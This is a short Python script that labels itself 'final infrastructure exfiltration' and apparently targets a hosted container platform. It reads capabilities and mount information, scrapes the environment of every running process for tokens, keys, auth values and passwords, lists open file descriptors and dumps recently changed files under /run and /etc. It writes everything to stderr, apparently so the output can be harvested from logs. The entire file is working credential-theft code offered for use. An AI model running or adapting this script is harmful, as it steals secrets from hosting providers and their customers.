import os
import sys
import subprocess

def log(msg):
    sys.stderr.write(f"\n[!!!] {msg}\n")

def run_full_dump():
    log("STARTING FINAL INFRASTRUCTURE EXFILTRATION")
 
    log("CHECKING SYSTEM CAPABILITIES")
    try:
        cap = subprocess.check_output("capsh --print", shell=True).decode()
        sys.stderr.write(cap)
    except:
        sys.stderr.write("capsh not found\n")

 
    log("EXTRACTING DETAILED MOUNTINFO")
    try:
        with open("/proc/self/mountinfo", "r") as f:
            sys.stderr.write(f.read())
    except Exception as e:
        sys.stderr.write(f"Mountinfo access failed: {e}\n")
 
    log("SCRAPING ALL PROCESS ENVIRONMENTS")
    for pid in range(1, 200):
        p = f"/proc/{pid}/environ"
        if os.path.exists(p):
            try:
                with open(p, "rb") as f:
                    data = f.read().replace(b'\0', b'\n').decode(errors='ignore')
                    # Фильтруем мусор, ищем только жирные ключи
                    keys = [l for l in data.split('\n') if any(x in l for x in ["RAILWAY", "TOKEN", "KEY", "AUTH", "PASS"])]
                    if keys:
                        sys.stderr.write(f"\n--- PID {pid} SECRETS ---\n" + "\n".join(keys) + "\n")
            except:
                continue

 
    log("SCANNING OPEN FILE DESCRIPTORS")
    for pid in range(1, 50):
        fd_dir = f"/proc/{pid}/fd"
        if os.path.exists(fd_dir):
            try:
                for fd in os.listdir(fd_dir):
                    link = os.readlink(os.path.join(fd_dir, fd))
                    if any(x in link for x in ["memfd", "pipe", "socket", "tmp"]):
                         sys.stderr.write(f"PID {pid} FD {fd} -> {link}\n")
            except:
                continue

 
    log("SEARCHING FOR RECENT CONFIGS IN /RUN")
    try:
 
        res = subprocess.check_output("find /run /etc -mmin -10 -type f 2>/dev/null", shell=True).decode()
        sys.stderr.write(res)
    except:
        pass

    sys.stderr.flush()
 
    os._exit(1)

if __name__ == "__main__":
    run_full_dump()
